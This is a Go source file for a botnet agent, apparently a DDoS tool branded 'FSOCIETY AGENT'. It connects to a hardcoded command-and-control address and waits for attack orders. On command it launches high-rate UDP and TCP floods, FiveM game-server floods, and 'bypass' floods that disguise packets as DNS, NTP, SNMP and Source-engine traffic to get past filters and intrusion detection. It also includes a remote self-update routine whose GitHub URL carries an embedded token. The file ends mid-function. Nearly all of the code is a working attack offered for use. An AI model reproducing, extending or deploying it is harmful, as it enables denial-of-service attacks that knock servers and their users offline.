package main

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	AColorReset   = "\033[0m"
	AColorMagenta = "\033[35m"
	AColorRed     = "\033[31m"
	AColorGreen   = "\033[32m"
	AColorCyan    = "\033[36m"
	AColorYellow  = "\033[33m"
	AColorBold    = "\033[1m"
	AColorDim     = "\033[2m"
)

const asciiArt = AColorMagenta + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⡈⠐⠠⢁⠂⠐⢀⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠿⣷⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠠⢁⠂⠄⠀⣛⠀⡟⢁⣠⣄⠀⠀⠀⠙⢻⡟⠉⠀⠀⢀⣴⣦⣬⠃⣬⣅⠀⢂⠐⡀⢂⠐⠠⠀⠄⠠⠀⠄⠠⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡁⢂⠈⠀⠾⡛⢱⡿⢿⣿⣿⣿⣦⣄⣠⣼⣷⣤⣤⣶⠿⠿⢿⣟⠆⢉⡛⠆⠀⢂⠐⠠⠈⠄⠡⠈⠄⠡⢈⠐⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡐⢀⠂⢠⣾⡟⣸⣰⡿⠁⠀⠀⠙⣿⡇⣿⣿⠸⣿⠁⢀⣀⣀⣙⡸⠎⢿⡆⠀⠂⠌⠠⠁⠌⠠⠁⠌⡐⢀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠟⡸⢛⣤⣼⣿⣿⣿⣤⣼⠇⣿⣿⠀⢧⣿⣿⣿⣿⣿⣿⣧⣄⠃⠀⢃⠘⡀⢃⠘⡀⠃⠄⠠⢀⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢂⠡⠈⠄⢈⡾⠋⢹⣿⣿⣿⣿⡟⢡⣴⣿⣿⣷⣦⡙⢿⣿⣿⣿⣿⠀⠙⠀⠈⡀⢂⠐⡀⠂⠄⠡⢈⠐⡀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠄⢂⠡⠀⢸⠀⠀⢸⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣿⡇⠸⢿⣿⣿⡟⠀⠀⠀⠀⡐⢀⠂⠄⠡⢈⠐⡀⢂⠐⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⡐⠠⠀⠀⠀⠀⠙⠋⠉⠀⠀⠉⠉⠙⠛⠋⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⠐⠠⠈⠄⡁⢂⠐⡀⠂⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⠐⠠⠁⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⠀⠀⢀⠂⠌⠠⢁⠂⡐⢀⠂⠄⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠈⠄⠡⢈⠐⡀⠸⣿⣦⡀⠀⠀⠛⠒⠚⠛⠛⠛⠛⠀⢀⣴⣿⠃⠀⠌⡀⠂⠌⡐⢀⠂⡐⠠⠈⠄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠡⢈⠐⡀⠂⠄⠀⢻⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠀⠐⠠⢀⠁⢂⠐⡀⠂⠄⠡⢈⠐⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⡐⢀⠂⠄⠡⠈⠄⠘⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡿⠃⠀⠌⡐⠠⠈⠄⠂⠄⠡⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⠄⠡⢈⠐⠀⠀⠙⠃⣿⣿⣿⣿⣿⣿⣿⣿⡗⠋⠀⣤⠀⠀⠀⠡⠈⠄⠡⢈⠐⠠⠈⠄⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠡⠈⠄⡁⠂⠀⠀⣤⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠇⣠⣾⣿⠀⣰⠀⠀⠀⣈⡀⠀⠈⠀⠁⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡈⠄⠁⠂⠀⠀⠀⠀⢻⣿⣷⠬⠉⠉⠉⠉⠉⠉⠀⠚⢿⣿⣿⢀⣿⡀⠀⠀⢹⣿⣿⣿⣿⣶⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⢸⣧⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣾⣿⡇⠀⠁⠀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣟⡿⠀⠀⠀⠀⣿⣿⣦⠘⣿⣶⠖⣠⠆⠀⠀⢳⣤⡙⢿⣟⣼⣿⣿⡇⠀⠐⡀⠈⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠃⠀⠀⠀⠀⢿⣿⣿⣷⣌⣿⣾⠏⠀⡀⠀⠸⡿⠿⠾⠿⠿⠿⠿⠷⠀⠀⠄⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢠⠀⡄⣴⠀⠀⡄⠐⠀⠀⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠀⠀⢀⠀⠠⠀⠄⢂⠐⠠⢈⠐⡈⠐⡀⢂⠐⠘⢷⡭⠂⠄⡁⢂⠀⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠐⠠⠈⡐⠠⠈⠄⠡⠈⠄⡈⠐⡀⠂⠄⠡⠐⠠⠨⠄⠆⠠⠌⠠⠐⠠⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡿⠿⠿⠀⣼⡿⠿⣿⡆⢠⣿⠿⢿⣷⠀⣼⡿⠿⣿⡆⢸⣿⠀⣿⡿⠿⠿⠀⠾⢿⣿⠿⠇⠘⣿⡄⣰⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣧⣤⡄⠀⢿⣧⣤⣤⡁⢨⣿⠀⢀⣿⠀⣿⡇⠀⠀⠁⢸⣿⠀⣿⣧⣤⡄⠀⠀⢸⣿⠀⠀⠀⠘⢿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡏⠁⠁⠀⣤⣍⣈⣿⡇⢸⣿⣀⣀⣿⠀⣿⣇⣀⣤⡄⢸⣿⠀⣿⣇⣉⣀⠀⠀⢸⣿⠀⠀⠀⠀⢸⣯⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠙⠛⠛⠛⠁⠀⠛⠛⠛⠋⠀⠘⠛⠛⠛⠁⠘⠛⠀⠛⠛⠛⠛⠀⠀⠘⠛⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀` + "\n" + AColorReset

// AttackCommand structure to receive from controller
type AttackCommand struct {
	TargetIP   string `json:"target_ip"`
	TargetPort int    `json:"target_port"`
	Threads    int    `json:"threads"`
	Duration   int    `json:"duration"`
	Method     string `json:"method"`
}

// CheckForUpdates fetches the latest source from GitHub and replaces the local file
func CheckForUpdates(githubURL string) {
	if githubURL == "" || strings.Contains(githubURL, "https://raw.githubusercontent.com/szhubofficial/DeinVadder/refs/heads/main/bot.py?token=GHSAT0AAAAAADXR6SEYFR2M4DCPMZ7KYN7Q2NS2JZQ") {
		return
	}

	fmt.Printf("%s[*] Checking for updates from GitHub...%s\n", AColorCyan, AColorReset)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(githubURL)
	if err != nil {
		fmt.Printf("%s[!] Failed to check for updates: %v%s\n", AColorRed, err, AColorReset)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("%s[!] Update check failed (Status: %d)%s\n", AColorRed, resp.StatusCode, AColorReset)
		return
	}

	newSource, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("%s[!] Failed to read update content: %v%s\n", AColorRed, err, AColorReset)
		return
	}

	// Compare with current file
	currentSource, err := os.ReadFile("agent.go")
	if err == nil && string(currentSource) == string(newSource) {
		fmt.Printf("%s[+] Agent is already up to date.%s\n", AColorGreen, AColorReset)
		return
	}

	// Backup and update
	err = os.WriteFile("agent.go", newSource, 0644)
	if err != nil {
		fmt.Printf("%s[!] Failed to update agent.go: %v%s\n", AColorRed, err, AColorReset)
		return
	}

	fmt.Printf("%s[+] Update successful! Please restart the agent to apply changes.%s\n", AColorGreen, AColorReset)
	os.Exit(0)
}

// AUdpFlood implements high-performance UDP flooding
func AUdpFlood(IP, PORT string, SECONDS int, SIZE int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if SIZE <= 0 {
		SIZE = 1472
	}

	fmt.Printf("[%s] UDP Flood started: %s:%s for %ds (%d bytes)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, SIZE)

	var stopFlag int32 = 0
	var ppsCounter int64 = 0

	payload := make([]byte, SIZE)
	rand.Read(payload)

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Optimized concurrency settings
	workers := runtime.NumCPU() * 4
	if workers < 32 {
		workers = 32
	}
	const socketsPerWorker = 16
	const batch = 500

	type workerConns struct {
		conns []*net.UDPConn
	}
	allConns := make([]workerConns, workers)

	var initWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		initWg.Add(1)
		go func(workerIdx int) {
			defer initWg.Done()
			c := make([]*net.UDPConn, 0, socketsPerWorker)
			for k := 0; k < socketsPerWorker; k++ {
				conn, err := net.DialUDP("udp4", nil, raddr)
				if err != nil {
					continue
				}
				conn.SetWriteBuffer(16 * 1024 * 1024)
				c = append(c, conn)
			}
			allConns[workerIdx].conns = c
		}(i)
	}
	initWg.Wait()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		conns := allConns[i].conns
		if len(conns) == 0 {
			continue
		}
		wg.Add(1)
		go func(c []*net.UDPConn) {
			defer wg.Done()
			n := len(c)
			idx := 0
			for {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				for j := 0; j < batch; j++ {
					c[idx].Write(payload)
					idx++
					if idx >= n {
						idx = 0
					}
				}
				atomic.AddInt64(&ppsCounter, batch)
			}
		}(conns)
	}

	// Live stats display
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				gbps := float64(pps) * float64(SIZE) * 8 / 1e9
				fmt.Printf("[%s] PPS: %d (%.1f kpps) | %.2f Gbit/s\n",
					time.Now().Format("15:04:05"), pps, float64(pps)/1000.0, gbps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()

	// Cleanup
	for i := 0; i < workers; i++ {
		for _, c := range allConns[i].conns {
			c.Close()
		}
	}
	fmt.Printf("[%s] UDP Flood finished.\n", time.Now().Format("15:04:05"))
}

// AUdpBypass uses a wide array of protocol-mimicking payloads for advanced filter evasion
func AUdpBypass(IP, PORT string, SECONDS int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] ADVANCED UDP Bypass started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	var stopFlag int32 = 0
	var ppsCounter int64 = 0

	// Expanded bypass payloads: VSE, DNS, NTP, STUN, SNMP, and fragmented simulation
	const variants = 32
	payloads := make([][]byte, variants)
	basePayloads := [][]byte{
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),                                                     // VSE
		[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"), // DNS
		[]byte("\x17\x00\x03\x2a\x00\x00\x00\x00"),                                                             // NTP
		[]byte("\x00\x01\x00\x08\x21\x12\xa4\x42"),                                                             // STUN
		[]byte("\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00"), // SNMP
	}

	for i := 0; i < variants; i++ {
		base := basePayloads[i%len(basePayloads)]
		p := make([]byte, len(base)+rand.Intn(64))
		copy(p, base)
		if len(p) > len(base) {
			rand.Read(p[len(base):])
		}
		payloads[i] = p
	}

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	workers := runtime.NumCPU() * 4
	if workers < 32 {
		workers = 32
	}
	const socketsPerWorker = 16
	const batchSize = 250

	type workerConns struct {
		conns []*net.UDPConn
	}
	allConns := make([]workerConns, workers)

	var initWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		initWg.Add(1)
		go func(workerIdx int) {
			defer initWg.Done()
			c := make([]*net.UDPConn, 0, socketsPerWorker)
			for k := 0; k < socketsPerWorker; k++ {
				conn, err := net.DialUDP("udp4", nil, raddr)
				if err != nil {
					continue
				}
				conn.SetWriteBuffer(16 * 1024 * 1024)
				c = append(c, conn)
			}
			allConns[workerIdx].conns = c
		}(i)
	}
	initWg.Wait()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		conns := allConns[i].conns
		if len(conns) == 0 {
			continue
		}
		wg.Add(1)
		go func(c []*net.UDPConn) {
			defer wg.Done()
			n := len(c)
			idx := 0
			pIdx := 0
			for {
				// Frequent stop-flag checks for precision
				for j := 0; j < batchSize; j++ {
					if j%50 == 0 && atomic.LoadInt32(&stopFlag) == 1 {
						return
					}
					c[idx].Write(payloads[pIdx])
					idx++
					if idx >= n {
						idx = 0
					}
					pIdx++
					if pIdx >= variants {
						pIdx = 0
					}
				}
				atomic.AddInt64(&ppsCounter, batchSize)
			}
		}(conns)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] ADV-BYPASS PPS: %d\n",
					time.Now().Format("15:04:05"), pps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()

	for i := 0; i < workers; i++ {
		for _, c := range allConns[i].conns {
			c.Close()
		}
	}
	fmt.Printf("[%s] ADV UDP Bypass finished.\n", time.Now().Format("15:04:05"))
}

// APpsBypass focuses on maximum packet rate with randomized content
func APpsBypass(IP, PORT string, SECONDS int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] PPS Bypass started: %s:%s for %ds (EXTREME SPEED)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	var stopFlag int32 = 0
	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Pre-generate 256 different 64-byte random payloads to avoid rand.Read overhead in loop
	const payloadCount = 256
	const payloadSize = 64
	payloads := make([][]byte, payloadCount)
	for i := 0; i < payloadCount; i++ {
		p := make([]byte, payloadSize)
		rand.Read(p)
		payloads[i] = p
	}

	workers := runtime.NumCPU() * 4
	if workers < 32 {
		workers = 32
	}
	const socketsPerWorker = 32
	const batch = 1000

	type workerConns struct {
		conns []*net.UDPConn
	}
	allConns := make([]workerConns, workers)

	var initWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		initWg.Add(1)
		go func(workerIdx int) {
			defer initWg.Done()
			c := make([]*net.UDPConn, 0, socketsPerWorker)
			for k := 0; k < socketsPerWorker; k++ {
				conn, err := net.DialUDP("udp4", nil, raddr)
				if err != nil {
					continue
				}
				conn.SetWriteBuffer(32 * 1024 * 1024)
				c = append(c, conn)
			}
			allConns[workerIdx].conns = c
		}(i)
	}
	initWg.Wait()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		conns := allConns[i].conns
		if len(conns) == 0 {
			continue
		}
		wg.Add(1)
		go func(c []*net.UDPConn) {
			defer wg.Done()
			n := len(c)
			idx := 0
			pIdx := 0
			for {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				for j := 0; j < batch; j++ {
					c[idx].Write(payloads[pIdx])
					idx++
					if idx >= n {
						idx = 0
					}
					pIdx++
					if pIdx >= payloadCount {
						pIdx = 0
					}
				}
				atomic.AddInt64(&ppsCounter, batch)
			}
		}(conns)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] EXTREME-PPS: %d (%.1f kpps)\n",
					time.Now().Format("15:04:05"), pps, float64(pps)/1000.0)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()

	for i := 0; i < workers; i++ {
		for _, c := range allConns[i].conns {
			c.Close()
		}
	}
	fmt.Printf("[%s] PPS Bypass finished.\n", time.Now().Format("15:04:05"))
}

// AGbpBypass focuses on maximum gigabit throughput with protocol masking
func AGbpBypass(IP, PORT string, SECONDS int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] GB/s Bypass started: %s:%s for %ds (MAX THROUGHPUT)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	var stopFlag int32 = 0
	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Large payloads (1350 bytes) with masked protocol headers to bypass IDSs
	const payloadSize = 1350
	const variants = 16
	payloads := make([][]byte, variants)
	for i := 0; i < variants; i++ {
		p := make([]byte, payloadSize)
		rand.Read(p)
		// Inject some protocol signatures
		if i%3 == 0 {
			copy(p[0:10], []byte("\xff\xff\xff\xffTSource"))
		} else if i%3 == 1 {
			copy(p[0:12], []byte("\x00\x00\x01\x00\x00\x01\x03www"))
		}
		payloads[i] = p
	}

	workers := runtime.NumCPU() * 4
	if workers < 32 {
		workers = 32
	}
	const socketsPerWorker = 16 // Balanced for throughput vs PPS
	const batch = 250

	type workerConns struct {
		conns []*net.UDPConn
	}
	allConns := make([]workerConns, workers)

	var initWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		initWg.Add(1)
		go func(workerIdx int) {
			defer initWg.Done()
			c := make([]*net.UDPConn, 0, socketsPerWorker)
			for k := 0; k < socketsPerWorker; k++ {
				conn, err := net.DialUDP("udp4", nil, raddr)
				if err != nil {
					continue
				}
				conn.SetWriteBuffer(32 * 1024 * 1024)
				c = append(c, conn)
			}
			allConns[workerIdx].conns = c
		}(i)
	}
	initWg.Wait()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		conns := allConns[i].conns
		if len(conns) == 0 {
			continue
		}
		wg.Add(1)
		go func(c []*net.UDPConn) {
			defer wg.Done()
			n := len(c)
			idx := 0
			pIdx := 0
			for {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				for j := 0; j < batch; j++ {
					c[idx].Write(payloads[pIdx])
					idx++
					if idx >= n {
						idx = 0
					}
					pIdx++
					if pIdx >= variants {
						pIdx = 0
					}
				}
				atomic.AddInt64(&ppsCounter, batch)
			}
		}(conns)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				gbps := float64(pps) * float64(payloadSize) * 8 / 1e9
				fmt.Printf("[%s] GBP-BYPASS: %d PPS | %.2f Gbit/s\n",
					time.Now().Format("15:04:05"), pps, gbps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()

	for i := 0; i < workers; i++ {
		for _, c := range allConns[i].conns {
			c.Close()
		}
	}
	fmt.Printf("[%s] GB/s Bypass finished.\n", time.Now().Format("15:04:05"))
}

// ATcpFlood implements high-performance TCP flooding
func ATcpFlood(IP, PORT string, SECONDS int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] TCP Flood started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	var stopFlag int32 = 0
	var connCounter int64 = 0

	target := net.JoinHostPort(IP, PORT)
	payload := make([]byte, 1024)
	rand.Read(payload)

	workers := runtime.NumCPU() * 2
	if workers < 16 {
		workers = 16
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				// Rapidly dial and send data
				conn, err := net.DialTimeout("tcp", target, 2*time.Second)
				if err == nil {
					conn.SetDeadline(time.Now().Add(1 * time.Second))
					conn.Write(payload)
					conn.Close()
					atomic.AddInt64(&connCounter, 1)
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				conns := atomic.SwapInt64(&connCounter, 0)
				fmt.Printf("[%s] TCP STATS: %d Connections/s\n",
					time.Now().Format("15:04:05"), conns)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()
	fmt.Printf("[%s] TCP Flood finished.\n", time.Now().Format("15:04:05"))
}

// AFivemFlood mimics FiveM OOB packets to bypass game-specific filters
func AFivemFlood(IP, PORT string, SECONDS int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] FiveM Flood started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	var stopFlag int32 = 0
	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// FiveM OOB (Out-Of-Band) payloads
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetinfo xxx\x00"),
		[]byte("\xff\xff\xff\xffgetstatus\x00"),
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
	}

	workers := runtime.NumCPU() * 4
	if workers < 32 {
		workers = 32
	}
	const socketsPerWorker = 16
	const batchSize = 250

	type workerConns struct {
		conns []*net.UDPConn
	}
	allConns := make([]workerConns, workers)

	var initWg sync.WaitGroup
	for i := 0; i < workers; i++ {
		initWg.Add(1)
		go func(workerIdx int) {
			defer initWg.Done()
			c := make([]*net.UDPConn, 0, socketsPerWorker)
			for k := 0; k < socketsPerWorker; k++ {
				conn, err := net.DialUDP("udp4", nil, raddr)
				if err != nil {
					continue
				}
				conn.SetWriteBuffer(16 * 1024 * 1024)
				c = append(c, conn)
			}
			allConns[workerIdx].conns = c
		}(i)
	}
	initWg.Wait()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		conns := allConns[i].conns
		if len(conns) == 0 {
			continue
		}
		wg.Add(1)
		go func(c []*net.UDPConn) {
			defer wg.Done()
			n := len(c)
			m := len(payloads)
			idx := 0
			pIdx := 0
			for {
				for j := 0; j < batchSize; j++ {
					if j%50 == 0 && atomic.LoadInt32(&stopFlag) == 1 {
						return
					}
					c[idx].Write(payloads[pIdx])
					idx++
					if idx >= n {
						idx = 0
					}
					pIdx++
					if pIdx >= m {
						pIdx = 0
					}
				}
				atomic.AddInt64(&ppsCounter, batchSize)
			}
		}(conns)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] FIVEM-BYPASS PPS: %d\n",
					time.Now().Format("15:04:05"), pps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.StoreInt32(&stopFlag, 1)
	})

	wg.Wait()

	for i := 0; i < workers; i++ {
		for _, c := range allConns[i].conns {
			c.Close()
		}
	}
	fmt.Printf("[%s] FiveM Flood finished.\n", time.Now().Format("15:04:05"))
}

func main() {
	fmt.Print("\033[2J\033[H")
	fmt.Println(asciiArt)
	fmt.Println(AColorCyan + "        ╔═══════════════════════════════════╗" + AColorReset)
	fmt.Println(AColorCyan + "        ║  " + AColorBold + "    FSOCIETY AGENT [ALPHA]    " + AColorReset + AColorCyan + "   ║" + AColorReset)
	fmt.Println(AColorCyan + "        ║  " + AColorDim + "      Awaiting commands...     " + AColorReset + AColorCyan + "  ║" + AColorReset)
	fmt.Println(AColorCyan + "        ╚═══════════════════════════════════╝" + AColorReset)
	fmt.Println()

	// IMPORTANT: Set your raw GitHub URL here
	githubUpdateURL := ""

	if githubUpdateURL != "" {
		CheckForUpdates(githubUpdateURL)
	}

	controllerAddr := "89.36.35.109:9999"
	if len(os.Args) >= 2 {
		controllerAddr = os.Args[1]
	}

	for {
		fmt.Printf("%s[*] Connecting to %s...%s\n", AColorCyan, controllerAddr, AColorReset)
		conn, err := net.Dial("tcp", controllerAddr)
		if err != nil {
			fmt.Printf("%s[!] Connection failed. Retrying in 5s...%s\n", AColorRed, AColorReset)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Printf("%s[+] Connected! Listening for tasks...%s\n", AColorGreen, AColorReset)
		decoder := json.NewDecoder(conn)

		for {
			var cmd AttackCommand
			if err := decoder.Decode(&cmd); err != nil {
				fmt.Printf("%s[!] Connection lost: %v%s\n", AColorRed, err, AColorReset)
				conn.Close()
				break
			}

			fmt.Printf("%s[~] Target: %s:%d | Secs: %d | Method: %s%s\n",
				AColorCyan, cmd.TargetIP, cmd.TargetPort, cmd.Duration, cmd.Method, AColorReset)

			switch cmd.Method {
			case "UDP":
				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472)
			case "TCP":
				go ATcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration)
			case "FIVEM":
				go AFivemFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration)
			case "UDP-BYPASS":
				go AUdpBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration)
			case "PPS-BYPASS":
				go APpsBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration)
			case "GBP-BYPASS":
				go AGbpBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration)
			case "UPDATE":
				// Support updates via command too
				fmt.Printf("%s[*] Remote update command received.%s\n", AColorYellow, AColorReset)
				// Here we could pass a URL from the command if needed
			default:
				fmt.Printf("%s[!] Method '%s' not supported.%s\n", AColorRed, cmd.Method, AColorReset)
			}
		}
